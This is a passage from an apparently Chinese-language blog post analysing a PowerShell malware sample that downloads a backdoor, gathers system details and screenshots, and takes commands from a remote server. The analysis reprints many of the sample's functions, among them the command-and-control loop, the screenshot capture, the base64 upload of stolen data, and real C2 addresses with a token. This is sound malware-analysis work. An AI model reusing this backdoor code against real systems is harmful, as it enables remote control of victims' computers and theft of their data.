class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> K9Dpje9u4bcbqu351w()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span>((-<span class="number">1</span> + <span class="number">2</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        niqCW20((<span class="number">1</span> + <span class="number">3</span>));</span><br><span class="line">        <span class="built_in">start-sleep</span> -s ([int](([int](<span class="number">54</span> / <span class="number">3</span>)) / <span class="number">3</span>));</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;               <span class="variable">$IyWj2QTWwLSLVnb</span>.DownloadFile(<span class="string">"http://185.185.25.175/sDownloads/"</span>+ <span class="variable">$RLZNAuZxC9UqzY</span> + <span class="string">'.jpeg'</span>,<span class="variable">$ENV:public</span> +<span class="string">"\"</span>+ <span class="string">"ieee"</span> + <span class="string">".dat"</span>);</span><br><span class="line">            CHr0OkIxe0xiupYa;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_</span>.Exception.Message)</span><br><span class="line">            &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$RLZNAuZxC9UqzY</code>这个值等于GUID,<img src="https://i.loli.net/2019/10/02/RDgfKCjoh7FGUqB.png" alt="image.png"></p><p><code>while(1)</code>死循环直到从”<a href="http://185.185.25.175/sDownloads/&quot;+" target="_blank" rel="noopener">http://185.185.25.175/sDownloads/&quot;+</a> guid+ ‘.jpeg’,然后保存为 <code>%Public%ieee.dat</code></p><p>bl4ReiVGQkuTog($nt8brxx)</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> Lbl4ReiVGQkuTog(<span class="variable">$nt8brxx</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;     <span class="variable">$LaYS5yC59za8PFHRfm9Tp</span>=<span class="variable">$iywj2qtWwLSLvNB</span>.DownloadString(<span class="variable">$Nt8BrxX</span>);&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$Lq66fcth</span> = <span class="variable">$_</span>.Exception.Message;&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$LAYs5yC59zA8PFhrFm9tP</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$iywj2qtWwLSLvNB</code>是一个<code>WebClient</code>对象,存储了相关信息进行下载.</p><h5 id="fwlKy5wjJIz6CGCbzI-上传功能函数"><a href="#fwlKy5wjJIz6CGCbzI-上传功能函数" class="headerlink" title="fwlKy5wjJIz6CGCbzI() 上传功能函数"></a>fwlKy5wjJIz6CGCbzI() 上传功能函数</h5><p><img src="https://i.loli.net/2019/10/02/jqATBFtdcHDkI8i.png" alt="image.png"></p><p>死循环无限执行.</p><ol><li>gc功能提取<code>%temp%\log.txt</code>内容</li><li>转换为字符串</li><li>返回一个<code>utf-8</code>字符对象</li><li>base64转码</li><li>返回一个<code>utf-8</code>字符对象</li><li>以post方式上传数据</li></ol><p><img src="https://i.loli.net/2019/10/02/euh924LDNOybrXF.png" alt="image.png"></p><p>base64数据传输</p><p><img src="https://i.loli.net/2019/10/02/pX6JFcCebHuMEhI.png" alt="image.png"><img src="https://i.loli.net/2019/10/02/pC64S9NomiXjFcr.png" alt="image.png"></p><p>数据解析.</p><p>到此这个powershell下载上传器大概功能总结完了,简单概括来说就是一个上传电脑信息,下载后门的脚本文件.</p><h3 id="backdoor-powershell-ieee-dat"><a href="#backdoor-powershell-ieee-dat" class="headerlink" title="backdoor powershell ieee.dat"></a>backdoor powershell ieee.dat</h3><p><code>%public%\ieee.dat%</code></p><p>因为服务器已经关闭了,只能跟着师傅md5找样本了.</p><p>从<a href="https://otx.alienvault.com/" target="_blank" rel="noopener">https://otx.alienvault.com</a>找到相关样本信息.</p><h4 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h4><p><img src="https://i.loli.net/2019/10/06/ofkVKibWSslyu12.png" alt="image.png"></p><ol><li>变量u存放的是base64编码后的powershell代码</li><li><code>Encoding]::Unicode.GetString([System.Convert]::FromBase64String($u))</code>解码</li><li><code>gcm i*v*p*s*n</code>匹配<code>Invoke-Expression</code>执行内存中的powershell命令.</li></ol><h4 id="0x02-powershell-后门解析"><a href="#0x02-powershell-后门解析" class="headerlink" title="0x02 powershell 后门解析"></a>0x02 powershell 后门解析</h4><p>文件的代码太多了,现在还是根据看起来像是字符串的地方入手</p><h5 id="wltJBgnP"><a href="#wltJBgnP" class="headerlink" title="wltJBgnP()"></a>wltJBgnP()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> wltJBgnP()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;<span class="variable">$thaTh2FrqCarDJH_</span> = <span class="variable">$eNV:username</span>;&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$thATH2fRqCarDJh_</span> = <span class="string">"Username Error"</span>;&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ThATh2fRqCarDJH_</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取用户名,失败返回<code>&quot;Username Error&quot;</code></p><p>VDf4TkTOMy3p_Br8UL5nH()</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> VDf4TkTOMy3p_Br8UL5nH()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;<span class="variable">$tSppY_CTU6rBZN_</span> = (<span class="built_in">Get-WMIObject</span> win32_operatingsystem).name;<span class="variable">$tSppY_CTU6rBzN_</span> = <span class="variable">$tsppy_CTu6RBZN_</span>.replace(<span class="string">":"</span>,<span class="string">";"</span>);&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$TsPPy_cTu6rbZN_</span> = <span class="string">"os Name Error"</span>;&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$tSPpy_cTu6rbZN_</span>;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取系统名称将<code>:</code>替换成<code></code>;`失败返回”os Name Error”</p><h5 id="MUHr7u0hahhrAxQ"><a href="#MUHr7u0hahhrAxQ" class="headerlink" title="MUHr7u0hahhrAxQ"></a>MUHr7u0hahhrAxQ</h5><p>接受指令,运行屏幕截图操作,并且以post方式发送base64编码后的png数据,发送到<code>http://83.171.238.62/ls.php?TOKEN=Pomy54tvbRetceX&amp;funx=sc&amp;i={GUID}.png</code></p><p>将获取到的cmd命令用<strong>cmd /c</strong>执行,并且将返回的结果数据,经过<code>base64</code>编码,将编码后的数据以<code>Post</code>的方式发送到如下地址<code>http://83.171.238.62/ls.php?TOKEN=Pomy54tvbRetceX&amp;funx=res&amp;R={GUID}</code></p><p>如果<code>stratwith</code>函数既没有匹配到<strong>“cmd”</strong>以及<strong>“screenshot”</strong>字符串,则将其用<code>iex</code>命令执行,如果执行成功,就将执行后的返回结果,通过<code>base64</code>编码后,将编码数据以<code>Post</code>方式发送到<code>http://83.171.238.62/ls.php?TOKEN=Pomy54tvbRetceX&amp;funx=res&amp;R={GUID}地址</code></p><h5 id="d-1SmifuaaJWTHfuQgh"><a href="#d-1SmifuaaJWTHfuQgh" class="headerlink" title="d_1SmifuaaJWTHfuQgh()"></a>d_1SmifuaaJWTHfuQgh()</h5><p><img src="https://i.loli.net/2019/10/07/HuaI5mAXDM7gOiP.png" alt="image.png">创建webclient对象,模拟代理,下载回显</p><h5 id="n-n9tyYOaI9m6lB"><a href="#n-n9tyYOaI9m6lB" class="headerlink" title="n_n9tyYOaI9m6lB()"></a>n_n9tyYOaI9m6lB()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> n_n9tyYOaI9m6lB(<span class="variable">$XSOhPvlsxIYbHLA8bYyj</span>,<span class="variable">$kc5aUnEOK7xCY7Usl1s</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$t45lYeJN</span> = <span class="variable">$kC5auneOk7Xcy7usl1S</span>;</span><br><span class="line">        <span class="variable">$s6d70IV</span> = [System.Net.WebRequest]::Create(<span class="variable">$xsOHpVLsxIybHLa8bYyj</span>);</span><br><span class="line">        <span class="variable">$s6d70iV</span>.proxy = [Net.WebRequest]::GetSystemWebProxy();</span><br><span class="line">        <span class="variable">$s6d70Iv</span>.proxy.Credentials = [Net.CredentialCache]::DefaultCredentials;</span><br><span class="line">        <span class="variable">$wOGrHtrYusWGef</span> = [System.Text.Encoding]::UTF8.GetBytes(<span class="variable">$T45lyeJN</span>);</span><br><span class="line">        <span class="variable">$s6D70iv</span>.Method = <span class="string">"POST"</span>;</span><br><span class="line">        <span class="variable">$s6D70IV</span>.ContentLength = <span class="variable">$wogrHTrYuSwGef</span>.length;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$wogRHtRYuswGEf</span>.Length <span class="nomarkup">-gt</span> <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$QOUGx1Qkwlah9W</span> = <span class="variable">$s6d70iv</span>.GetRequestStream();</span><br><span class="line">            <span class="variable">$qoUgx1Qkwlah9W</span>.Write(<span class="variable">$wOgRHTRyuswGEF</span>, (<span class="number">1</span> - <span class="number">1</span>), <span class="variable">$wogrhtryuswgef</span>.Length);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        [System.Net.WebResponse] <span class="variable">$rAtaxJplMEbTuO8yApqOg</span> = <span class="variable">$S6D70Iv</span>.GetResponse();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$rAtAXjpLMeBTuo8Yapqog</span> <span class="nomarkup">-ne</span> <span class="literal">$NUlL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$EgAFhyjSEtNkIMP714inO</span> = <span class="variable">$RatAXjPLMEbtuO8yAPQOg</span>.GetResponseStream();</span><br><span class="line">            [System.IO.StreamReader] <span class="variable">$Cx3Ig4SFBZ75udmdkzK2</span> = <span class="built_in">New-Object</span> System.IO.StreamReader <span class="variable">$EGAfhyjSeTNkIMP714ino</span>;</span><br><span class="line">            [String] <span class="variable">$FsVCEsC5h</span> = <span class="variable">$cx3IG4SfbZ75uDmdkZk2</span>.ReadToEnd();</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fsVcESC5h</span> = (<span class="string">"httpPOST"</span> + <span class="variable">$_</span>.Exception.Message);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$FsVceSC5H</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>第一个参数是请求的地址,第二个参数是请求的内容</li><li><code>[System.Net.WebRequest]::Create</code>传入第一个参数初始化<code>WebRequest</code>实例</li><li>获取本地ie代理,并设置为默认证书</li><li>采用utf-8编码数据</li><li>使用<code>POST</code>发送</li><li>如果长度大于0,发送<code>GetRequestStream().Write()</code>请求山上,然后<code>.GetResponse()</code>接收数据</li><li>如果回显非空,<code>.GetResponseStream()</code>读入数据流,全部读取.</li></ol><h5 id="Aj9VVbP5C"><a href="#Aj9VVbP5C" class="headerlink" title="Aj9VVbP5C()"></a>Aj9VVbP5C()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> Aj9VVbP5C()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;<span class="variable">$Uy7hTSuBKQe33iYx5F74</span> = (<span class="built_in">Get-WmiObject</span> Win32_OperatingSystem).OSArchitecture;&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$uy7hTsubkQE33Iyx5f74</span> = <span class="string">"Architecture Error"</span>;&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$UY7HTSuBkQE33iYX5f74</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取系统位数<code>wmic.exe</code>使用<code>Win32_OperatingSystem).OSArchitecture</code></p><p>错误返回<code>&quot;Architecture Error&quot;</code>.</p><h5 id="Get-Screenshot"><a href="#Get-Screenshot" class="headerlink" title="Get-Screenshot"></a>Get-Screenshot</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> Get-Screenshot</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">Add-Type</span> -Assembly System.Windows.Forms;</span><br><span class="line">    <span class="variable">$I6G70ff34UmS</span> = [Windows.Forms.SystemInformation]::VirtualScreen;</span><br><span class="line">    <span class="variable">$EFZ1lbLwseYcDKV7</span> = <span class="built_in">New-Object</span> Drawing.Bitmap <span class="variable">$I6g70Ff34uMS</span>.Width, <span class="variable">$I6g70FF34ums</span>.Height;</span><br><span class="line">    <span class="variable">$sOmy4QAQ9e</span> = [Drawing.Graphics]::FromImage(<span class="variable">$eFz1LbLWSeYcdkv7</span>);</span><br><span class="line">    <span class="variable">$SOmY4QAQ9e</span>.CopyFromScreen( <span class="variable">$I6g70ff34UMs</span>.Location, [Drawing.Point]::Empty, <span class="variable">$I6g70fF34umS</span>.Size);</span><br><span class="line">    <span class="variable">$SoMY4qAq9e</span>.Dispose();</span><br><span class="line">    <span class="variable">$sb3uxBawrTjS5HJ4zIaU</span> = <span class="built_in">New-Object</span> System.IO.MemoryStream;</span><br><span class="line">    <span class="variable">$EFz1lblwseyCdkV7</span>.save(<span class="variable">$SB3uxBAWRtjS5hj4zIaU</span>, [Drawing.Imaging.ImageFormat]::Png);</span><br><span class="line">    <span class="variable">$EFZ1lBLWSeycDkv7</span>.Dispose();</span><br><span class="line">    [convert]::ToBase64String(<span class="variable">$SB3UxbAWrTjS5hj4ZIau</span>.ToArray());</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取虚拟屏幕,设置bitmap长宽高,<code>CopyFromScreen</code>将屏幕图像拷贝到新创建的绘制图像的对象中.将图像保存为<code>png</code>图片格式并且将图片数据存入<code>内存流</code>中.将png图片的内存流数据转数组后进行<code>base64</code>编码后返回加密后的值</p><h5 id="S4xKxH-WG0KMOE"><a href="#S4xKxH-WG0KMOE" class="headerlink" title="S4xKxH_WG0KMOE()"></a>S4xKxH_WG0KMOE()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> S4xKxH_WG0KMOE()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$zKxMjXPiRVG_n5lBSQ</span> = D_1smifUAajwThfuQgh(<span class="string">"https://api.ipify.org/"</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ZKxmjXPiRvg_N5LBSq</span> = <span class="string">"IP Error"</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ZKxMJXpIrVG_n5lBSq</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取ip地址,错误返回<code>IP Error</code></p><h5 id="CwC1Fafld-XtJSe6wx"><a href="#CwC1Fafld-XtJSe6wx" class="headerlink" title="CwC1Fafld_XtJSe6wx()"></a>CwC1Fafld_XtJSe6wx()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> CwC1Fafld_XtJSe6wx()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>((<span class="built_in">Test-Path</span> -Path (<span class="string">"HKCU:\SOFTWARE\Microsoft\key"</span>)) <span class="nomarkup">-eq</span> <span class="literal">$True</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$OEnh0UdnFPnPN</span> = (<span class="built_in">Get-ItemProperty</span> -Path <span class="string">"HKCU:\SOFTWARE\Microsoft\key"</span> -Name SecretKey).SecretKey;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$R_17TGuFklA1FDgTjmDMN</span> = <span class="built_in">New-Item</span> -Path <span class="string">"HKCU:\SOFTWARE\Microsoft"</span> -Name key -Force;</span><br><span class="line">        <span class="built_in">start-sleep</span> -s <span class="number">2</span>;</span><br><span class="line">        <span class="variable">$VgMxEqS7XdszsJidfE</span> = [guid]::NewGuid().Guid;</span><br><span class="line">        <span class="built_in">Set-ItemProperty</span> -Path <span class="string">"HKCU:\Software\Microsoft\key"</span> -Name SecretKey -Value <span class="variable">$VgMxEqS7XDSzSjidfe</span>;</span><br><span class="line">        <span class="built_in">start-sleep</span> -s <span class="number">2</span>;</span><br><span class="line">        <span class="variable">$oEnH0udnFPNpN</span> = <span class="variable">$vGMxEQS7XDSzsJIdfe</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$oenH0udnfpnpN</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查键值是否存在.如果存在获得键值.不存在的话新建项,再创建健值,写入guid.</p><h5 id="QTix4hIfIA2oQE8g"><a href="#QTix4hIfIA2oQE8g" class="headerlink" title="QTix4hIfIA2oQE8g()"></a>QTix4hIfIA2oQE8g()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> QTix4hIfIA2oQE8g()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$UC55RYB_3NieoNp</span> = <span class="built_in">New-Object</span> Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent());</span><br><span class="line">        <span class="variable">$mmMfY1GeC_ZHoT3</span> = <span class="variable">$uC55ryb_3Nieonp</span>.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$mMmFY1GeC_ZHoT3</span> <span class="nomarkup">-eq</span> <span class="literal">$TRUe</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$mMMfY1GeC_zHoT3</span> = <span class="string">"Admin"</span>;  </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span> (<span class="variable">$MMMFy1GEC_zHoT3</span> <span class="nomarkup">-eq</span> <span class="literal">$false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$mMMfy1GEc_zhot3</span> = <span class="string">"User"</span>;</span><br><span class="line">        &#125;      </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$mMMFY1gEc_zHoT3</span> = <span class="string">"Error Role"</span>;   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$mMMfY1GEC_zHoT3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获得令牌访问等级,判断是否再鹳狸猿组,是返回Admin,不是返回<code>User</code>.没有的话返回<code>Error Role</code>.</p><h5 id="yKGVMK8K"><a href="#yKGVMK8K" class="headerlink" title="yKGVMK8K()"></a>yKGVMK8K()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function yKGVMK8K()</span><br><span class="line">&#123;</span><br><span class="line">    $N4aN42GXmRJ = Cwc1FAfLd_XTJse6WX;</span><br><span class="line">    $n4an42gxMRj += &quot;:&quot;;</span><br><span class="line">    $n4an42gxMRJ += WlTjBGnp; //Username</span><br><span class="line">    $n4aN42GxMRJ += &quot;:&quot;;</span><br><span class="line">    $N4An42GxMrJ += VDf4TktOMY3P_Br8UL5nH; //SystemNameame</span><br><span class="line">    $N4aN42gxmrJ += &quot;&quot;;</span><br><span class="line">    $N4an42GxMrj += aj9VVbp5c; //OS Arch</span><br><span class="line">    $N4an42gxMrj += &quot;:&quot;;</span><br><span class="line">    $n4aN42GxmrJ += S4XKXh_wG0KMOE; //ip address</span><br><span class="line">    $N4aN42gxmrj += &quot;:&quot;;</span><br><span class="line">    $N4AN42gxMrJ += qTix4hiFia2oQe8G; //UserInrole</span><br><span class="line">    return $n4an42gxMRJ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拼接信息.</p><h5 id="最后的逻辑分析"><a href="#最后的逻辑分析" class="headerlink" title="最后的逻辑分析"></a>最后的逻辑分析</h5><p>8350行左右</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(True)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$xGWoj_n</span> = ykGVMk8k;</span><br><span class="line">    <span class="variable">$VGmxeqS7XdsZsJidfe</span> = CwC1FaFld_xTJSe6Wx;</span><br><span class="line">    n_n9tYyoAi9M6lB (<span class="string">"http://83.171.238.62/ls.php?TOKEN=Pomy54tvbRetceX&amp;funx=reg&amp;UU="</span>+&#123;guid&#125;) <span class="variable">$XgWoj_n</span>; //</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$r_17tGufKlA1FDgTjmDMN</span> = d_1smIfUAAjWthFUqGH( <span class="string">"http://83.171.238.62/command/"</span>+&#123;guid&#125;+<span class="string">".cmd"</span>);;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$R_17TgufKla1FdGTjmdmn</span> <span class="nomarkup">-ne</span> (<span class="string">'Error'</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$ImSwyJmd_fJGEkqlFUV</span> = <span class="variable">$r_17tGufkla1FDGtJmDmn</span>;</span><br><span class="line">d_1SMIFuAajwtHFuqGh(<span class="string">"http://83.171.238.62/ls.php?TOKEN=Pomy54tvbRetceX&amp;funx=uDel&amp;filename="</span>+&#123;guid&#125;+<span class="string">".cmd"</span>);</span><br><span class="line">            mUHr7u0HAhhRaXq <span class="variable">$iMswYJMd_fJGeKQLFUv</span>;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="variable">$EI30VubHIRyTC9q5rk878</span> = <span class="variable">$wu9qWfKFH</span>;</span><br><span class="line">    <span class="variable">$KkB6gQH8Z1</span> = <span class="variable">$BZDhtwfnPOb_v_h</span>;</span><br><span class="line">    <span class="variable">$I2w_uXTB</span> = (([int](<span class="number">15770</span> / <span class="number">10</span>))*<span class="variable">$kkB6GQH8Z1</span>);</span><br><span class="line">    <span class="variable">$wu9QWfkfH</span> = ((-<span class="number">2276</span>)*((<span class="number">8153</span> - <span class="number">3952</span>)+(((-<span class="number">3651</span>)-<span class="variable">$Uf4CDF6_B9NwImxt7Hh</span>)*(-<span class="number">39</span> + <span class="number">3047</span>))));</span><br><span class="line">    <span class="variable">$JNipBG0Ov_kT15R</span> = ((((<span class="number">1</span> * <span class="number">1009</span>)*<span class="variable">$V0Jkv8aqZHMdcdppAixIV</span>)+<span class="variable">$uyoxQcm_VhLGn</span>)*((-<span class="number">2374</span>)-((-<span class="number">883</span>)*(-<span class="number">774</span>))));</span><br><span class="line">    <span class="variable">$T9y70kYH</span> = (-(<span class="number">13</span> * <span class="number">211</span>));</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>执行上个函数获得系统信息</li><li>上传屏幕截图</li><li>下载<code>.cmd</code>文件</li><li>如果下载内容不为’’Error’’则<code>d_1SMIFuAajwtHFuqGh</code>下载其他<code>.cmd</code>命令,并执行.</li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>断断续续把这个样本分析完了,属实体力活啊.感觉整体文章结构没写好.都是从头到尾分析样本文件,最后应该文章里做大致的规划,应该更具有从样本编写者角度来看的分析文章.也从零学会了简单的powershell语法和调试等,调试分析office宏汇编分析和脚本.未来还多需努力,少摸鱼,多学习~.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="样本分析" scheme="http://xwdidi.top/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
      <category term="恶意软件" scheme="http://xwdidi.top/tags/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/"/>
    
      <category term="宏代码" scheme="http://xwdidi.top/tags/%E5%AE%8F%E4%BB%A3%E7%A0%81/"/>
    
